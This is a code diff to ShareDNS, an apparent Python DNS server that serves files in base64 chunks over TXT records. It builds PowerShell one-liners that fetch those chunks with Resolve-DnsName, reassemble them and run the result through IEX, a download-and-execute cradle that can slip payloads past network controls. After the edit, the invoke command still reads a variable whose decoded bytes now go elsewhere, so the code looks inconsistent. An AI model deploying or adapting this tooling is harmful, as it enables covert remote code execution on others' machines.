@@ -9,8 +9,8 @@ from dnslib import DNSRecord,RCODE,QTYPE,RR,TXT
 from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger
 import cachetools.func
 
-MAX_TXT_SIZE = 185 # 255/4/*3
-MAX_TRANSFER_SIZE = MAX_TXT_SIZE * 5
+MAX_TXT_SIZE = 250
+MAX_TRANSFER_SIZE = MAX_TXT_SIZE
 
 class ShareDNS(BaseResolver):
     def __init__(self, domain, files_path):
@@ -51,8 +51,7 @@ class ShareDNS(BaseResolver):
                                     request.q.qname,
                                     QTYPE.TXT,
                                     ttl=60,
-                                    rdata=TXT([ b64encode(chunk[i:i + MAX_TXT_SIZE]) for i in range(0, len(chunk), MAX_TXT_SIZE)])
-                                    #rdata=TXT(b64encode(chunk))
+                                    rdata=TXT([ chunk[i:i + MAX_TXT_SIZE] for i in range(0, len(chunk), MAX_TXT_SIZE)])
                                 ))
                         else:
                             reply.header.rcode = getattr(RCODE,'NXDOMAIN')
@@ -80,8 +79,10 @@ class ShareDNS(BaseResolver):
     def ls(self):
         return os.listdir(self.files_path)
 
+    @cachetools.func.ttl_cache(maxsize=1, ttl=60)
     def get_file_chunks(self, fname):
         f = open(os.path.join(self.files_path, fname), "rb").read()
+        f = b64encode(f)
         return [f[i:i + MAX_TRANSFER_SIZE] for i in range(0, len(f), MAX_TRANSFER_SIZE)]
 
     def get_file_hash(self, fname):
@@ -89,7 +90,7 @@ class ShareDNS(BaseResolver):
         return hashlib.sha256(b).hexdigest()
 
     def gen_download_cmd(self, fname, n_chunks):
-        return '$o=[byte[]]::new(0);0..' + str(n_chunks-1) + '|%{$p=$_;0..99|%{try{$r=(Resolve-DnsName "$p.'+ fname + '.f.' + self.domain + '" -Type TXT -ErrorAction Stop).Strings;return}catch{sleep 1}};$r.ForEach({$o+=[Convert]::FromBase64String($_)})}'
+        return '$o="";0..' + str(n_chunks-1) + '|%{$p=$_;0..99|%{try{$r=(Resolve-DnsName "$p.'+ fname + '.f.' + self.domain + '" -Type TXT -ErrorAction Stop).Strings;return}catch{sleep 1}};$r.ForEach({$o+=$_})};$res=[Convert]::FromBase64String($o)'
 
     def gen_download_invoke_cmd(self, fname, n_chunks):
         return self.gen_download_cmd(fname, n_chunks) + ';[Text.Encoding]::Utf8.GetString($o)|IEX'
